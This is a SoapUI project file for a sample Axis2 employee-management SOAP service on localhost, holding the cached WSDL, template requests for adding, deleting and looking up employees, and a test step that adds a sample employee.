<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project id="cd5327f3-449f-49b4-9d60-cc0657da8032" activeEnvironment="Default" name="Automation Project" resourceRoot="" soapui-version="5.5.0" abortOnError="false" runType="SEQUENTIAL" xmlns:con="http://eviware.com/soapui/config"><con:settings/><con:interface xsi:type="con:WsdlInterface" id="348b136f-7460-4661-847d-eababc881743" wsaVersion="NONE" name="EmployeeManagementServiceSoap12Binding" type="wsdl" bindingName="{http://sample.com/reservation/guest}EmployeeManagementServiceSoap12Binding" soapVersion="1_2" anonymous="optional" definition="http://localhost:8090/axis2/services/EmployeeManagementService?wsdl" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings/><con:definitionCache type="TEXT" rootPart="http://localhost:8090/axis2/services/EmployeeManagementService?wsdl"><con:part><con:url>http://localhost:8090/axis2/services/EmployeeManagementService?wsdl</con:url><con:content><![CDATA[<wsdl:definitions targetNamespace="http://sample.com/reservation/guest" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:ns="http://sample.com/reservation/guest/types" xmlns:wsaw="http://www.w3.org/2006/05/addressing/wsdl" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" xmlns:tns="http://sample.com/reservation/guest" xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:ax21="http://exception.reservation.sample.com/xsd" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:ns1="http://org.apache.axis2/xsd" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
  <wsdl:documentation>EmployeeManagementService</wsdl:documentation>
  <wsdl:types>
    <xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://exception.reservation.sample.com/xsd">
      <xs:complexType name="EmployeeManagementException">
        <xs:sequence>
          <xs:element minOccurs="0" name="message" nillable="true" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
    </xs:schema>
    <xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://sample.com/reservation/guest/types" xmlns:ax22="http://exception.reservation.sample.com/xsd">
      <xs:import namespace="http://exception.reservation.sample.com/xsd"/>
      <xs:element name="EmployeeManagementServiceEmployeeManagementException">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="EmployeeManagementException" nillable="true" type="ax22:EmployeeManagementException"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="addEmployee">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="name" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="id" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="Department" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="age" type="xs:int"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="addEmployeeResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="return" type="xs:boolean"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="deleteEmployee">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="employeeName" nillable="true" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="getEmployeeDetails">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="employeeName" nillable="true" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="getEmployeeDetailsResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="return" nillable="true" type="ns:Employee"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:complexType name="Employee">
        <xs:sequence>
          <xs:element minOccurs="0" name="age" type="xs:int"/>
          <xs:element minOccurs="0" name="department" nillable="true" type="xs:string"/>
          <xs:element minOccurs="0" name="id" nillable="true" type="xs:string"/>
          <xs:element minOccurs="0" name="name" nillable="true" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
    </xs:schema>
  </wsdl:types>
  <wsdl:message name="getEmployeeDetailsRequest">
    <wsdl:part name="parameters" element="ns:getEmployeeDetails"/>
  </wsdl:message>
  <wsdl:message name="getEmployeeDetailsResponse">
    <wsdl:part name="parameters" element="ns:getEmployeeDetailsResponse"/>
  </wsdl:message>
  <wsdl:message name="EmployeeManagementServiceEmployeeManagementException">
    <wsdl:part name="parameters" element="ns:EmployeeManagementServiceEmployeeManagementException"/>
  </wsdl:message>
  <wsdl:message name="deleteEmployeeRequest">
    <wsdl:part name="parameters" element="ns:deleteEmployee"/>
  </wsdl:message>
  <wsdl:message name="addEmployeeRequest">
    <wsdl:part name="parameters" element="ns:addEmployee"/>
  </wsdl:message>
  <wsdl:message name="addEmployeeResponse">
    <wsdl:part name="parameters" element="ns:addEmployeeResponse"/>
  </wsdl:message>
  <wsdl:portType name="EmployeeManagementServicePortType">
    <wsdl:operation name="getEmployeeDetails">
      <wsdl:input message="tns:getEmployeeDetailsRequest" wsaw:Action="urn:getEmployeeDetails"/>
      <wsdl:output message="tns:getEmployeeDetailsResponse" wsaw:Action="urn:getEmployeeDetailsResponse"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:getEmployeeDetailsEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <wsdl:input message="tns:deleteEmployeeRequest" wsaw:Action="urn:deleteEmployee"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:deleteEmployeeEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <wsdl:input message="tns:addEmployeeRequest" wsaw:Action="urn:addEmployee"/>
      <wsdl:output message="tns:addEmployeeResponse" wsaw:Action="urn:addEmployeeResponse"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:addEmployeeEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="EmployeeManagementServiceSoap11Binding" type="tns:EmployeeManagementServicePortType">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
    <wsdl:operation name="getEmployeeDetails">
      <soap:operation soapAction="urn:getEmployeeDetails" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <soap:operation soapAction="urn:deleteEmployee" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <soap:operation soapAction="urn:addEmployee" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="EmployeeManagementServiceSoap12Binding" type="tns:EmployeeManagementServicePortType">
    <soap12:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
    <wsdl:operation name="getEmployeeDetails">
      <soap12:operation soapAction="urn:getEmployeeDetails" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <soap12:operation soapAction="urn:deleteEmployee" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <soap12:operation soapAction="urn:addEmployee" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="EmployeeManagementServiceHttpBinding" type="tns:EmployeeManagementServicePortType">
    <http:binding verb="POST"/>
    <wsdl:operation name="getEmployeeDetails">
      <http:operation location="getEmployeeDetails"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
      <wsdl:output>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <http:operation location="deleteEmployee"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <http:operation location="addEmployee"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
      <wsdl:output>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="EmployeeManagementService">
    <wsdl:port name="EmployeeManagementServiceHttpSoap11Endpoint" binding="tns:EmployeeManagementServiceSoap11Binding">
      <soap:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/"/>
    </wsdl:port>
    <wsdl:port name="EmployeeManagementServiceHttpSoap12Endpoint" binding="tns:EmployeeManagementServiceSoap12Binding">
      <soap12:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/"/>
    </wsdl:port>
    <wsdl:port name="EmployeeManagementServiceHttpEndpoint" binding="tns:EmployeeManagementServiceHttpBinding">
      <http:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpEndpoint/"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>]]></con:content><con:type>http://schemas.xmlsoap.org/wsdl/</con:type></con:part></con:definitionCache><con:endpoints><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint></con:endpoints><con:operation id="8638f18f-a231-4b34-aebd-e19927d3b3d5" isOneWay="false" action="urn:addEmployee" name="addEmployee" bindingOperationName="addEmployee" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="f5afceb0-cc18-4842-b915-b4aca109b34c" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soap:Header/>\r
   <soap:Body>\r
      <typ:addEmployee>\r
         <!--Optional:-->\r
         <typ:name>?</typ:name>\r
         <!--Optional:-->\r
         <typ:id>?</typ:id>\r
         <!--Optional:-->\r
         <typ:Department>?</typ:Department>\r
         <!--Optional:-->\r
         <typ:age>?</typ:age>\r
      </typ:addEmployee>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:addEmployee"/></con:call></con:operation><con:operation id="fdda81e1-36b4-4413-87a4-28b0b0512920" isOneWay="false" action="urn:deleteEmployee" name="deleteEmployee" bindingOperationName="deleteEmployee" type="One-Way" inputName="" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="c1b7e79d-6115-402e-bf45-736f865439b9" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soap:Header/>\r
   <soap:Body>\r
      <typ:deleteEmployee>\r
         <!--Optional:-->\r
         <typ:employeeName>?</typ:employeeName>\r
      </typ:deleteEmployee>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:deleteEmployee"/></con:call></con:operation><con:operation id="582ea7e5-f45a-4d43-a045-b6929137e6b3" isOneWay="false" action="urn:getEmployeeDetails" name="getEmployeeDetails" bindingOperationName="getEmployeeDetails" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="d7efb2ef-8a43-408a-ace8-0ae18d56e22d" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soap:Header/>\r
   <soap:Body>\r
      <typ:getEmployeeDetails>\r
         <!--Optional:-->\r
         <typ:employeeName>?</typ:employeeName>\r
      </typ:getEmployeeDetails>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:getEmployeeDetails"/></con:call></con:operation></con:interface><con:interface xsi:type="con:WsdlInterface" id="954e0876-f721-46ee-b1f7-e98fa3fa6667" wsaVersion="NONE" name="EmployeeManagementServiceSoap11Binding" type="wsdl" bindingName="{http://sample.com/reservation/guest}EmployeeManagementServiceSoap11Binding" soapVersion="1_1" anonymous="optional" definition="http://localhost:8090/axis2/services/EmployeeManagementService?wsdl" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings/><con:definitionCache type="TEXT" rootPart="http://localhost:8090/axis2/services/EmployeeManagementService?wsdl"><con:part><con:url>http://localhost:8090/axis2/services/EmployeeManagementService?wsdl</con:url><con:content><![CDATA[<wsdl:definitions targetNamespace="http://sample.com/reservation/guest" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:ns="http://sample.com/reservation/guest/types" xmlns:wsaw="http://www.w3.org/2006/05/addressing/wsdl" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" xmlns:tns="http://sample.com/reservation/guest" xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:ax21="http://exception.reservation.sample.com/xsd" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:ns1="http://org.apache.axis2/xsd" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
  <wsdl:documentation>EmployeeManagementService</wsdl:documentation>
  <wsdl:types>
    <xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://exception.reservation.sample.com/xsd">
      <xs:complexType name="EmployeeManagementException">
        <xs:sequence>
          <xs:element minOccurs="0" name="message" nillable="true" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
    </xs:schema>
    <xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://sample.com/reservation/guest/types" xmlns:ax22="http://exception.reservation.sample.com/xsd">
      <xs:import namespace="http://exception.reservation.sample.com/xsd"/>
      <xs:element name="EmployeeManagementServiceEmployeeManagementException">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="EmployeeManagementException" nillable="true" type="ax22:EmployeeManagementException"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="deleteEmployee">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="employeeName" nillable="true" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="addEmployee">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="name" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="id" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="Department" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="age" type="xs:int"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="addEmployeeResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="return" type="xs:boolean"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="getEmployeeDetails">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="employeeName" nillable="true" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="getEmployeeDetailsResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="return" nillable="true" type="ns:Employee"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:complexType name="Employee">
        <xs:sequence>
          <xs:element minOccurs="0" name="age" type="xs:int"/>
          <xs:element minOccurs="0" name="department" nillable="true" type="xs:string"/>
          <xs:element minOccurs="0" name="id" nillable="true" type="xs:string"/>
          <xs:element minOccurs="0" name="name" nillable="true" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
    </xs:schema>
  </wsdl:types>
  <wsdl:message name="getEmployeeDetailsRequest">
    <wsdl:part name="parameters" element="ns:getEmployeeDetails"/>
  </wsdl:message>
  <wsdl:message name="getEmployeeDetailsResponse">
    <wsdl:part name="parameters" element="ns:getEmployeeDetailsResponse"/>
  </wsdl:message>
  <wsdl:message name="EmployeeManagementServiceEmployeeManagementException">
    <wsdl:part name="parameters" element="ns:EmployeeManagementServiceEmployeeManagementException"/>
  </wsdl:message>
  <wsdl:message name="deleteEmployeeRequest">
    <wsdl:part name="parameters" element="ns:deleteEmployee"/>
  </wsdl:message>
  <wsdl:message name="addEmployeeRequest">
    <wsdl:part name="parameters" element="ns:addEmployee"/>
  </wsdl:message>
  <wsdl:message name="addEmployeeResponse">
    <wsdl:part name="parameters" element="ns:addEmployeeResponse"/>
  </wsdl:message>
  <wsdl:portType name="EmployeeManagementServicePortType">
    <wsdl:operation name="getEmployeeDetails">
      <wsdl:input message="tns:getEmployeeDetailsRequest" wsaw:Action="urn:getEmployeeDetails"/>
      <wsdl:output message="tns:getEmployeeDetailsResponse" wsaw:Action="urn:getEmployeeDetailsResponse"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:getEmployeeDetailsEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <wsdl:input message="tns:deleteEmployeeRequest" wsaw:Action="urn:deleteEmployee"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:deleteEmployeeEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <wsdl:input message="tns:addEmployeeRequest" wsaw:Action="urn:addEmployee"/>
      <wsdl:output message="tns:addEmployeeResponse" wsaw:Action="urn:addEmployeeResponse"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:addEmployeeEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="EmployeeManagementServiceSoap11Binding" type="tns:EmployeeManagementServicePortType">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
    <wsdl:operation name="getEmployeeDetails">
      <soap:operation soapAction="urn:getEmployeeDetails" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <soap:operation soapAction="urn:deleteEmployee" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <soap:operation soapAction="urn:addEmployee" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="EmployeeManagementServiceSoap12Binding" type="tns:EmployeeManagementServicePortType">
    <soap12:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
    <wsdl:operation name="getEmployeeDetails">
      <soap12:operation soapAction="urn:getEmployeeDetails" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <soap12:operation soapAction="urn:deleteEmployee" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <soap12:operation soapAction="urn:addEmployee" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="EmployeeManagementServiceHttpBinding" type="tns:EmployeeManagementServicePortType">
    <http:binding verb="POST"/>
    <wsdl:operation name="getEmployeeDetails">
      <http:operation location="getEmployeeDetails"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
      <wsdl:output>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <http:operation location="deleteEmployee"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <http:operation location="addEmployee"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
      <wsdl:output>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="EmployeeManagementService">
    <wsdl:port name="EmployeeManagementServiceHttpSoap11Endpoint" binding="tns:EmployeeManagementServiceSoap11Binding">
      <soap:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/"/>
    </wsdl:port>
    <wsdl:port name="EmployeeManagementServiceHttpSoap12Endpoint" binding="tns:EmployeeManagementServiceSoap12Binding">
      <soap12:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/"/>
    </wsdl:port>
    <wsdl:port name="EmployeeManagementServiceHttpEndpoint" binding="tns:EmployeeManagementServiceHttpBinding">
      <http:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpEndpoint/"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>]]></con:content><con:type>http://schemas.xmlsoap.org/wsdl/</con:type></con:part></con:definitionCache><con:endpoints><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint></con:endpoints><con:operation id="c0392574-0f10-4e02-a81b-9948fd0d390e" isOneWay="false" action="urn:addEmployee" name="addEmployee" bindingOperationName="addEmployee" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="a80895c3-8e15-48c2-9175-c6e4a1f9a6d8" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <typ:addEmployee>\r
         <!--Optional:-->\r
         <typ:name>?</typ:name>\r
         <!--Optional:-->\r
         <typ:id>?</typ:id>\r
         <!--Optional:-->\r
         <typ:Department>?</typ:Department>\r
         <!--Optional:-->\r
         <typ:age>?</typ:age>\r
      </typ:addEmployee>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:addEmployee"/></con:call></con:operation><con:operation id="ec7ca546-6ab6-4de7-910f-7966a29cb068" isOneWay="false" action="urn:deleteEmployee" name="deleteEmployee" bindingOperationName="deleteEmployee" type="One-Way" inputName="" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="39591955-8ec6-49b5-8b7c-6d77b6b33a9a" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <typ:deleteEmployee>\r
         <!--Optional:-->\r
         <typ:employeeName>?</typ:employeeName>\r
      </typ:deleteEmployee>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:deleteEmployee"/></con:call></con:operation><con:operation id="7117f58c-dc96-4ed1-b026-8f0674cf0370" isOneWay="false" action="urn:getEmployeeDetails" name="getEmployeeDetails" bindingOperationName="getEmployeeDetails" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="bac0a903-2b02-4a54-af1b-6c1e5ce46659" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <typ:getEmployeeDetails>\r
         <!--Optional:-->\r
         <typ:employeeName>?</typ:employeeName>\r
      </typ:getEmployeeDetails>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:getEmployeeDetails"/></con:call></con:operation></con:interface><con:testSuite id="bb3bf08d-53b5-47f5-a9d0-4b556017d3de" name="Test suite 1"><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="ab56e942-e0ec-42dd-9bbd-f8e76bca2ea0" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Add Employee" searchProperties="true"><con:settings/><con:testStep type="request" name="TS_Add" id="71216c55-3201-4fef-9b2c-4d50394ff046"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>EmployeeManagementServiceSoap12Binding</con:interface><con:operation>addEmployee</con:operation><con:request name="TS_Add" id="c3f49766-d179-457d-b8b3-2c9811e4f225"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">
   <soap:Header/>
   <soap:Body>
      <typ:addEmployee>
         <!--Optional:-->
         <typ:name>hrtttt</typ:name>
         <!--Optional:-->
         <typ:id>34</typ:id>
         <!--Optional:-->
         <typ:Department/>
         <!--Optional:-->
         <typ:age>22</typ:age>
      </typ:addEmployee>
   </soap:Body>
